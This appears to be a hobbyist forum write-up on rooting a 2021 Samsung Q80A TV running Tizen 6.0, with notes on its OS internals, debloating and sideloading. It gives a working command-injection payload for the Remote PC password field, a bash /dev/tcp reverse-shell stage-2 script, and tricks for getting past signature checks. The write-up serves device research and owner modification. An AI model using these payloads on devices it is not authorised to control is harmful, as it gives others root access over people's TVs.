# Rooted my 2021 Samsung Q80A (Tizen 6.0 / NikeM2) via the Remote PC CIFS mount — full write-up

**TL;DR:** The "Shared Folder" feature of Samsung's Remote PC app passes your SMB *password* through a root shell unsanitized. `$(/bin/bash</home/owner/share/r)` as the Windows account password gives you a root reverse shell on any NikeM2 TV (Tizen 6.0, 2021). No firmware mods, no dev-mode signing tricks, ~2 min to re-arm after reboot.

---

## The TV

- Samsung QN55Q80AAGXZD (55" Q80A, 2021)
- Tizen **6.0**, firmware `T-NKM2UABC 2301.1`, platform `21_NIKEM2_QTV`
- Kernel `4.1.10 armv7l`, root context `System::Privileged` when popped

## The vulnerability

The Remote PC app (`org.tizen.remotepc`) lets you open a Windows share from the TV. Under the hood:

1. `remotepc_uilauncher` writes a credentials file `/tmp/fileXXXX`:
   ```
   username=<user>
   password=<password>
   smbpath=<share>
   ```
2. It calls `CallCommand("ps_mount_cifs", args)` on the privileged D-Bus service `com.safe.ps_agent` (object `/com/safe/ps_agent`)
3. `ps_agent` runs `/usr/apps/privileged-service/bin/mount.smb.sh`, which does roughly:
   ```sh
   /bin/bash -c "/bin/mount -o ro,nosuid,noexec,nodev,username=...,password=$(<password-field>),vers=2.1 //IP/share /opt/usr/home/owner/content/smb/share"
   ```

The password field is interpolated **inside the shell command** — a classic command-injection. The only constraint: **spaces become commas** in the args, so the payload can't contain spaces.

Payload that works:

```
$(/bin/bash</home/owner/share/r)
```

set as the actual Windows account password (Remote PC requires the password to be a valid login *and* contain the payload — same field is used for SMB auth). `/home/owner/share/r` is a stage-2 script persisted on writable storage:

```sh
#!/bin/bash
/bin/bash -i >& /dev/tcp/<pc-ip>/9998 0>&1
```

You get `uid=0(root) gid=0(root) context="System::Privileged"`.

Notably, `smbpath` (the share name) is **not** evaluated — only the password is. And the `$(...)` blocks the mount forever (it's `bash -i` holding a socket), so each mount = one shell; killing `mount.smb.sh` kills the shell.

## What survives a reboot — and what doesn't

| Persists | Volatile |
|---|---|
| Everything under `/opt` (apps, config, `/opt/usr/apps/*`) | Root shell itself |
| `/home/owner/share/*` (stage-2) | UEP/authorization bypass |
| Package removals via `pkgcmd -u` | Bind mounts |

So root is "one click away" after reboot (swap the Windows password to the payload, click Shared Folder) but there is **no free persistence** — files persist, privilege doesn't. That matches what the samsung-tv-root folks found on QN90B/F.

## UEP notes (relevant to anyone patching files)

- Executing `bash script.sh` on an unsigned file: **blocked** — `[uep][bash] the file is NOT signed!!`
- `bash < script.sh` (stdin redirect) passes — UEP hooks the exec-on-file path
- Scripts under `/opt/etc/` carry appended `##UEP530x...` signatures — editing them kills execution
- **BUT** app content JS under `/opt/usr/apps/<pkg>/res/` is *not* UEP-signed — TizenBrew's Node service files are patchable and keep working

## Things found while mapping the OS

**HDMI/CEC/debug interfaces:**
- `/sys/devices/virtual/extcon/hdmi_det_info/` — per-port cable detect (`cable.0..15` → HDMI1-6, `H*_c`, ARC, EARC)
- `org.tizen.tv.hdmicec` D-Bus service (doc: `/usr/bin/hdmicec-api.xml`) — full CEC API: device list, names, ports, types, active source, `SendKeyToHdmicec`
- `/dev/video21` = `sdp-hdmi` V4L2 capture node — live input timings accessible via `VIDIOC_QUERY_DV_TIMINGS`
- `com.samsung.ISourceControl` on `tvs-daemon` — source switching (introspection XML is malformed, methods TBD)
- **Service menu without remote key combos:** `app_launcher -s org.tizen.factory` opens the factory/debug menu directly — useful on the minimalist remote that has no MENU/INFO buttons

**SWU key material** (NikeM2, first public extraction afaik):
- `/usr/share/org.tizen.tv.swu/` holds `itemsAESPassphraseEncrypted`, `itemsPublicRSAKey`, `OpenAPIAESPassphraseEncrypted`, etc.
- The AES passphrase is TrustZone-wrapped — upgrade.msd (`MSDU11`, `aes-256-cbc-sha512`) stays encrypted without the SWUStandalone/trustlet path

**HyperTizen definitively requires Tizen 6.5+:**
- Its `Capturer.cs` P/Invokes `cs_ve_get_rgb_measure_condition/position/pixel` from `libvideoenhance.so`
- On 6.0 the lib exists (`libvideoenhance.so.0.1`) but **doesn't export any `*_rgb_measure_*` symbols** — it's not a packaging/cert issue, the API just isn't there

**sdb quirks:**
- TCP 26101 accepts CNXN (`device::QN55Q80AAGXZD::0`) and `sysinfo:` answers fine (Tizen 6.0 confirmed)
- `shell:`/`sync:` streams are silently refused — dev-mode Host PC IP is set to `127.0.0.1` (which TizenBrew needs anyway)

## What worked in practice

- **Debloat**: `pkgcmd -u` removed 12 preinstalled apps (Disney+, Xbox, Spotify, Apple TV, Globoplay, Alexa, e-Manual, Security Center, SmartOne IPTV, Samsung Promotion) — all `end ok`. Leftover gray tiles on the launcher until reboot. Did **not** touch the ad/analytics/ACR services (`coba.adagent`, `adplayer`, `acr-service-app`, `canalysis-service`) — high risk of a broken-until-reset Smart Hub; DNS blocking covers the network side anyway
- **Sideload without dev-mode signing pain**: `pkgcmd -i -t wgt` as root installed TizenTube 2.1.1 and Jellyfin fine. Caveat: an upgrade signed by a *different* author cert fails with `Author certificate not match [-11]` — hit this on Moonlight (OneLiberty→brightcraft maintainer change)
- **TizenBrew local modules**: patched the NG service (it's plain Node in `/opt`, unsigned) to load `local/<name>` modules from a directory on the TV — mods without jsDelivr publishing. Backup `.orig` files next to each patched file
- **WLED ambilight on 6.0** (HyperTizen replacement): TizenBrew site-mod that samples `<video>` edges → module `service.js` (Node, `dgram`) → DDP UDP straight to WLED. Works only inside web apps (YouTube/Jellyfin-web) — there is no system-wide capture API on 6.0, period
- **Samsung remote WS (8001/8002)**: `ms.channel.unauthorized`, no pairing popup even with Device Connect Manager open — the route is basically dead on this firmware; `app_launcher` covers everything anyway
- **Service menu**: read-only inspection — `Local Set`, `Type`, `Panel`, `NATION`, EEPROM/Factory reset are the brick-adjacent options; don't touch

## Open questions / next steps

- Reproducing `CallCommand` on `com.safe.ps_agent` via direct `busctl` — the call reaches the daemon (timeouts match the captured UI traffic) but `mount.smb.sh` never spawned in my tests; if someone cracks the caller rules this becomes software-only re-root with no RDP at all
- `tvs-daemon` `ISourceControl` methods for programmatic source switching + signal metadata
- A tiny ARM helper for `VIDIOC_QUERY_DV_TIMINGS` on `/dev/video21` → real resolution/fps/HDR of the HDMI input for a diagnostics panel
- Whether any boot-time service executes unsigned content from `/opt` (real root persistence) — the UEP findings make me pessimistic but the app-js carve-out was a surprise

Repo with docs, package inventory (355 pkgs), kit scripts, and the WLED module exists locally — happy to share details in comments.
